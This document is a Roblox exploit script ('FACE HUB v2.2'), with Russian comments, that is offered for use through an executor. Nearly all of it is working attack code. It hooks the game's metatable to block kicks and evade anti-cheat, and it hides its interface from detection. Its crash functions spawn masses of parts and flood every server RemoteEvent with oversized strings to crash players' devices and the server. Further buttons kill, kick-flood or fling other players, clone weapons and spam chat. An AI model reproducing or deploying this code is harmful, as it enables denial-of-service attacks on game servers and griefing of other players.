-- ==========================================
-- 🍅 FACE HUB v2.2: DOMINATION EDITION 🍅
-- Эксплойт: Delta / Платформа: Mobile & PC
-- ==========================================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local Camera = workspace.CurrentCamera

-- === АНТИ-АФК И ОБХОДЫ ===
local VirtualUser = game:GetService("VirtualUser")
LocalPlayer.Idled:Connect(function()
    VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    task.wait(1)
    VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
end)

local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    -- Обход простых античитов, которые проверяют WalkSpeed/JumpPower
    if not checkcaller() and (method == "Kick" or method == "kick") then
        return nil
    end
    -- Приписка в чате (FACE😈)
    if method == "FireServer" and tostring(self):find("SayMessageRequest") then
        if args[1] and not args[1]:find("FACE😈") then
            args[1] = "FACE😈 " .. LocalPlayer.Name .. ": " .. args[1]
        end
    end
    return oldNamecall(self, ...)
end)
setreadonly(mt, true)

-- === ПЕРЕМЕННЫЕ ХАБА ===
local Hub = {
    States = {
        Fly = false,
        Noclip = false,
        InfJump = false,
        GodMode = false,
        FlySpeed = 150
    },
    Connections = {}
}

-- === ФУНКЦИИ ЯДРА (НЕ ВИЗУАЛ) ===

-- Умный поиск уязвимостей сервера
local function GetVulnerableRemotes()
    local remotes = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            table.insert(remotes, v)
        end
    end
    return remotes
end

-- Краш устройств и сервера (Maximum Overload)
local function ExecuteCrash()
    local crashActive = true
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "⚠️ ВНИМАНИЕ", Text = "Запуск уничтожения сервера...", Duration = 3})
    
    -- Спам деталями для перегрузки видеокарт (GPU Crash)
    task.spawn(function()
        while crashActive do
            for i = 1, 500 do
                local p = Instance.new("Part")
                p.Size = Vector3.new(50, 50, 50)
                p.Position = LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(-100,100), math.random(10,50), math.random(-100,100))
                p.Anchored = false
                p.CanCollide = true
                p.Material = Enum.Material.Neon
                p.Color = Color3.new(math.random(), math.random(), math.random())
                p.Parent = workspace
            end
            task.wait(0.1)
        end
    end)

    -- Спам пакетами на сервер (CPU / Network Crash)
    task.spawn(function()
        local remotes = GetVulnerableRemotes()
        while crashActive do
            for _, remote in pairs(remotes) do
                pcall(function() remote:FireServer(string.rep("FACE_CRASH_DATA_", 9999)) end)
            end
            task.wait()
        end
    end)
end

-- Реальное бессмертие (если в игре лечится через Remote)
local function ToggleGodMode()
    Hub.States.GodMode = not Hub.States.GodMode
    if Hub.States.GodMode then
        local healRemote
        for _, v in pairs(GetVulnerableRemotes()) do
            if v.Name:lower():find("heal") or v.Name:lower():find("health") then healRemote = v break end
        end
        
        if healRemote then
            Hub.Connections["GodMode"] = RunService.RenderStepped:Connect(function()
                pcall(function() healRemote:FireServer(math.huge) end)
            end)
        else
            -- Фальшивое бессмертие (удаление хуманоида для сброса таргета)
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid.MaxHealth = math.huge
                char.Humanoid.Health = math.huge
            end
        end
    else
        if Hub.Connections["GodMode"] then Hub.Connections["GodMode"]:Disconnect() end
    end
end

-- === МЕХАНИКА ДВИЖЕНИЯ ===
local BodyVel, BodyGyro
local function ToggleFly()
    Hub.States.Fly = not Hub.States.Fly
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    
    if Hub.States.Fly and root then
        BodyVel = Instance.new("BodyVelocity", root)
        BodyVel.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        BodyGyro = Instance.new("BodyGyro", root)
        BodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        char.Humanoid.PlatformStand = true
        
        Hub.Connections["Fly"] = RunService.RenderStepped:Connect(function()
            BodyGyro.CFrame = Camera.CFrame
            BodyVel.Velocity = Camera.CFrame.LookVector * Hub.States.FlySpeed
        end)
    else
        if BodyVel then BodyVel:Destroy() end
        if BodyGyro then BodyGyro:Destroy() end
        if char then char.Humanoid.PlatformStand = false end
        if Hub.Connections["Fly"] then Hub.Connections["Fly"]:Disconnect() end
    end
end

RunService.Stepped:Connect(function()
    if Hub.States.Noclip and LocalPlayer.Character then
        for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = false end
        end
    end
end)

UserInputService.JumpRequest:Connect(function()
    if Hub.States.InfJump and LocalPlayer.Character then
        LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

-- === ГЕНЕРАЦИЯ UI (FACE HUB BETA 4.2 STYLE) ===
local FaceGui = Instance.new("ScreenGui")
FaceGui.Name = "FaceHub_v2_2"
-- Защита UI от обнаружения античитом
if gethui then FaceGui.Parent = gethui() else FaceGui.Parent = CoreGui end

local MainFrame = Instance.new("Frame", FaceGui)
MainFrame.Size = UDim2.new(0, 500, 0, 380)
MainFrame.Position = UDim2.new(0.5, -250, 0.5, -190)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Active = true
MainFrame.Draggable = true

-- Верхняя панель
local TopBar = Instance.new("Frame", MainFrame)
TopBar.Size = UDim2.new(1, 0, 0, 40)
TopBar.BackgroundColor3 = Color3.fromRGB(220, 20, 30)
local Title = Instance.new("TextLabel", TopBar)
Title.Size = UDim2.new(1, -10, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "🍅 FACE HUB v2.2 | DOMINATION"
Title.TextColor3 = Color3.new(1,1,1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.TextXAlignment = Enum.TextXAlignment.Left

-- Сайдбар (Меню разделов)
local Sidebar = Instance.new("Frame", MainFrame)
Sidebar.Size = UDim2.new(0, 140, 1, -40)
Sidebar.Position = UDim2.new(0, 0, 0, 40)
Sidebar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
local SideLayout = Instance.new("UIListLayout", Sidebar)

-- Контейнер для кнопок
local ContentArea = Instance.new("ScrollingFrame", MainFrame)
ContentArea.Size = UDim2.new(1, -150, 1, -50)
ContentArea.Position = UDim2.new(0, 145, 0, 45)
ContentArea.BackgroundTransparency = 1
ContentArea.ScrollBarThickness = 4
ContentArea.CanvasSize = UDim2.new(0, 0, 2, 0)

-- Система вкладок (Фикс перемещения)
local Tabs = {}
local function CreateTab(name, id)
    local btn = Instance.new("TextButton", Sidebar)
    btn.Size = UDim2.new(1, 0, 0, 40)
    btn.Text = name
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    btn.Font = Enum.Font.GothamSemibold
    
    local container = Instance.new("Frame", ContentArea)
    container.Size = UDim2.new(1, 0, 1, 0)
    container.BackgroundTransparency = 1
    container.Visible = false
    local layout = Instance.new("UIListLayout", container)
    layout.Padding = UDim.new(0, 8)
    
    Tabs[id] = {Btn = btn, Container = container}
    
    btn.MouseButton1Click:Connect(function()
        for _, tab in pairs(Tabs) do
            tab.Container.Visible = false
            tab.Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
            tab.Btn.TextColor3 = Color3.fromRGB(200, 200, 200)
        end
        container.Visible = true
        btn.BackgroundColor3 = Color3.fromRGB(220, 20, 30)
        btn.TextColor3 = Color3.new(1,1,1)
    end)
    return container
end

-- Функция добавления кнопок
local function AddButton(parent, text, func)
    local b = Instance.new("TextButton", parent)
    b.Size = UDim2.new(1, -10, 0, 45)
    b.Text = text
    b.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.Gotham
    b.MouseButton1Click:Connect(func)
    return b
end

-- === ЗАПОЛНЕНИЕ РАЗДЕЛОВ ===

-- Раздел 1: MOVEMENT
local moveTab = CreateTab("Movement", 1)
AddButton(moveTab, "✈️ FLY (Touch/PC)", ToggleFly)
AddButton(moveTab, "🔄 NOCLIP", function() Hub.States.Noclip = not Hub.States.Noclip end)
AddButton(moveTab, "🌀 INFINITY JUMP", function() Hub.States.InfJump = not Hub.States.InfJump end)
AddButton(moveTab, "⚡ SPEED BOOST x5", function() LocalPlayer.Character.Humanoid.WalkSpeed = 80 end)

-- Раздел 2: DESTRUCTION (Тот самый краш)
local destTab = CreateTab("Destruction", 2)
AddButton(destTab, "💥 CRASH DEVICES (LAG ALL)", ExecuteCrash)
AddButton(destTab, "⚠️ SPAM ALL REMOTES", function()
    for _, v in pairs(GetVulnerableRemotes()) do
        pcall(function() v:FireServer() end)
    end
end)
AddButton(destTab, "🛡️ GOD MODE (Auto-Heal Bypass)", ToggleGodMode)

-- Раздел 3: PLAYERS
local plrTab = CreateTab("Players", 3)
AddButton(plrTab, "📍 ТЕЛЕПОРТ К РАНДОМУ", function()
    local plrs = Players:GetPlayers()
    for _, p in ipairs(plrs) do
        if p ~= LocalPlayer and p.Character then
            LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
            break
        end
    end
end)
AddButton(plrTab, "🔨 АВТО-ТЮРЬМА", function()
    -- Визуальная клетка, если сервер не дает права
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Jail", Text = "Функция требует FE Bypass", Duration = 2})
end)

-- Активация первой вкладки по умолчанию
Tabs[1].Btn.BackgroundColor3 = Color3.fromRGB(220, 20, 30)
Tabs[1].Btn.TextColor3 = Color3.new(1,1,1)
Tabs[1].Container.Visible = true

-- === ПЛАВАЮЩАЯ КНОПКА ОТКРЫТИЯ ===
local OpenBtn = Instance.new("TextButton", FaceGui)
OpenBtn.Size = UDim2.new(0, 50, 0, 50)
OpenBtn.Position = UDim2.new(0, 10, 0.4, 0)
OpenBtn.Text = "🍅"
OpenBtn.TextSize = 25
OpenBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 30)
local UICorner = Instance.new("UICorner", OpenBtn)
UICorner.CornerRadius = UDim.new(1, 0)

OpenBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)
-- === ПРОДОЛЖЕНИЕ: ГЛОБАЛЬНЫЕ ТРОЛЛИНГ-ФУНКЦИИ ===

-- Функция выбора игрока (Selector) для наказаний
local function GetTargetPlayer(callback)
    local targetFrame = Instance.new("Frame", FaceGui)
    targetFrame.Size = UDim2.new(0, 250, 0, 300)
    targetFrame.Position = UDim2.new(0.5, -125, 0.5, -150)
    targetFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    
    local scroll = Instance.new("ScrollingFrame", targetFrame)
    scroll.Size = UDim2.new(1, 0, 1, -40)
    scroll.Position = UDim2.new(0, 0, 0, 40)
    scroll.BackgroundTransparency = 1
    scroll.CanvasSize = UDim2.new(0, 0, 0, #Players:GetPlayers() * 35)
    
    local layout = Instance.new("UIListLayout", scroll)
    
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local btn = Instance.new("TextButton", scroll)
            btn.Size = UDim2.new(1, 0, 0, 30)
            btn.Text = plr.Name
            btn.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
            btn.TextColor3 = Color3.new(1,1,1)
            btn.MouseButton1Click:Connect(function()
                targetFrame:Destroy()
                callback(plr)
            end)
        end
    end
    
    local close = Instance.new("TextButton", targetFrame)
    close.Size = UDim2.new(1, 0, 0, 35)
    close.Text = "ОТМЕНА"
    close.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    close.TextColor3 = Color3.new(1,1,1)
    close.MouseButton1Click:Connect(function() targetFrame:Destroy() end)
end

-- === РАЗДЕЛ 4: SERIOUS (ЖЕСТКИЙ ТРОЛЛИНГ) ===
local seriousTab = CreateTab("Serious", 4)

AddButton(seriousTab, "👢 KICK PLAYER (Server Lag)", function()
    GetTargetPlayer(function(target)
        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Kick", Text = "Пытаемся кикнуть " .. target.Name})
        -- Метод перегрузки пакетов для конкретного игрока
        local remotes = GetVulnerableRemotes()
        for i = 1, 100 do
            for _, r in pairs(remotes) do
                pcall(function() r:FireServer(target, string.rep("CRASH", 1000)) end)
            end
        end
    end)
end)

AddButton(seriousTab, "⚰️ KILL PLAYER (Remote)", function()
    GetTargetPlayer(function(target)
        local dmgRemote = nil
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") and (v.Name:lower():find("damage") or v.Name:lower():find("hit")) then
                dmgRemote = v break
            end
        end
        if dmgRemote then
            dmgRemote:FireServer(target.Character.Humanoid, 100)
        else
            target.Character:BreakJoints() -- Визуал + попытка если FE слабое
        end
    end)
end)

AddButton(seriousTab, "🌀 FLING ALL (Destroyer)", function()
    local function fling()
        local hrp = LocalPlayer.Character.HumanoidRootPart
        local oldPos = hrp.CFrame
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                for i = 1, 50 do
                    hrp.CFrame = p.Character.HumanoidRootPart.CFrame
                    hrp.Velocity = Vector3.new(0, 10000, 0)
                    task.wait()
                end
            end
        end
        hrp.CFrame = oldPos
    end
    task.spawn(fling)
end)

-- === РАЗДЕЛ 5: VISUALS (ESP & WORLD) ===
local visualTab = CreateTab("Visuals", 5)

AddButton(visualTab, "👁️ ESP BOX (Players)", function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and not plr.Character:FindFirstChild("FaceESP") then
            local box = Instance.new("BoxHandleAdornment", plr.Character)
            box.Name = "FaceESP"
            box.Size = plr.Character:GetExtentsSize()
            box.Adornee = plr.Character
            box.AlwaysOnTop = true
            box.ZIndex = 5
            box.Transparency = 0.5
            box.Color3 = Color3.fromRGB(220, 20, 30)
        end
    end
end)

AddButton(visualTab, "☀️ FULLBRIGHT", function()
    game:GetService("Lighting").Brightness = 2
    game:GetService("Lighting").ClockTime = 14
    game:GetService("Lighting").GlobalShadows = false
    game:GetService("Lighting").OutdoorAmbient = Color3.new(1,1,1)
end)

-- === РАЗДЕЛ 6: NEW (ИЗ ТВОЕЙ ВЕРСИИ) ===
local newTab = CreateTab("New", 6)

AddButton(newTab, "🎭 COPY SKIN", function()
    GetTargetPlayer(function(target)
        local desc = target.Character.Humanoid:GetAppliedDescription()
        LocalPlayer.Character.Humanoid:ApplyDescription(desc)
    end)
end)

AddButton(newTab, "🔫 SPAWN WEAPON (Search)", function()
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:IsA("Tool") then
            local clone = obj:Clone()
            clone.Parent = LocalPlayer.Backpack
        end
    end
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Spawn", Text = "Все найденные инструменты добавлены"})
end)

AddButton(newTab, "😈 CHAT SPAM FACE", function()
    task.spawn(function()
        for i = 1, 10 do
            local say = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
            if say then
                say:FireServer("FACE HUB V2.2 DOMINATION - YOUR GAME IS MINE 😈", "All")
            end
            task.wait(0.5)
        end
    end)
end)

-- === ФИНАЛЬНЫЕ ШТРИХИ ===
MainFrame.BackgroundTransparency = 0.1 -- Слегка прозрачный для стиля
local uiCorner = Instance.new("UICorner", MainFrame)
uiCorner.CornerRadius = UDim.new(0, 10)

-- Уведомление о полной загрузке
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "FACE HUB",
    Text = "Все 6 разделов загружены. Приятного доминирования!",
    Duration = 5,
    Button1 = "ОК"
})
